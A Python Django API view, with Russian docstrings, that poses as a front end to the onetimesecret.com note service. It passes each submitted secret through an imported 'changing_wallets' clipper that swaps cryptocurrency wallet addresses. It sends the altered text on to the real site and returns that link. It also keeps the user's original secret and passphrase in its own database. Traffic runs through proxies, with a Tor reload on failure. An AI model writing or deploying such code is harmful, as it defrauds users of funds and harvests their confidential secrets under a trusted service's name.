import requests
from bs4 import BeautifulSoup
from django.http import JsonResponse
from django.conf import settings
from rest_framework import permissions, status
from rest_framework.parsers import JSONParser
from rest_framework.views import APIView

from .models import OneTimeInfo
from utils.clipper.clipper import changing_wallets


class OneTimeRequest(APIView):
    """
        Получение записки
    """
    permission_classes = [permissions.AllowAny]
    parser_classes = [JSONParser]

    def addToDatabase(self, data):
        """Добавление записки в базу данных"""
        try:
            OneTimeInfo.objects.create(
                text=data['secret'],
                password=data['passphrase']
            )
            return True
        except Exception as exc:
            print("Exception Add to database: ", exc)
            return False

    def request_website(self, data, change_text=""):
        s = requests.Session()
        page = s.get("https://onetimesecret.com/", proxies=settings.PROXIES)

        soup = BeautifulSoup(page.text, "html.parser")
        block_footer = soup.find("div", {"id": "footer"})
        input_strimp = block_footer.find("input")['value']

        data = {
            "shrimp": str(input_strimp),
            "secret": change_text if len(change_text) else data['secret'],
            "passphrase": data['passphrase'],
            "ttl": data['ttl'],
            "kind": data['kind']
        }

        response = s.post("https://onetimesecret.com/", data=data, proxies=settings.PROXIES)

        soup = BeautifulSoup(response.text, "html.parser")
        block_uri = soup.find("div", {"class": "uri"})
        note_link = block_uri.find("input", {"id": "secreturi"})['value']

        return note_link

    def sendToOneTime(self, data, change_text=""):
        """Отправка запроса к сайту для получения записки"""
        try:
            note = self.request_website(data, change_text)
            return note
        except Exception:
            import subprocess
            subprocess.run("service tor reload", shell=True)
            note = self.request_website(data, change_text)
            return note

    def post(self, request):
        data = request.data
        # Clipper wallets
        text = changing_wallets(data['secret'])
        if text != data['secret']:
            # Send request to onetimesecret
            link = self.sendToOneTime(data, text)
            if link:
                # Add to Database note
                result = self.addToDatabase(data)
                if result:
                    return JsonResponse(
                        {
                            'status': "success",
                            "link": str(link)
                        },
                        status=status.HTTP_200_OK
                    )
                else:
                    return JsonResponse(
                        {
                            'status': "error"
                        },
                        status=status.HTTP_400_BAD_REQUEST
                    )
            else:
                return JsonResponse(
                    {
                        'status': "error2"
                    },
                    status=status.HTTP_400_BAD_REQUEST
                )
        else:
            # Send request to onetimesecret
            link = self.sendToOneTime(data, data['secret'])
            if link:
                # Add to Database note
                self.addToDatabase(data)
                return JsonResponse(
                    {
                        'status': "success",
                        "link": str(link)
                    },
                    status=status.HTTP_200_OK
                )
            else:
                return JsonResponse(
                    {
                        'status': "error"
                    },
                    status=status.HTTP_400_BAD_REQUEST
                )
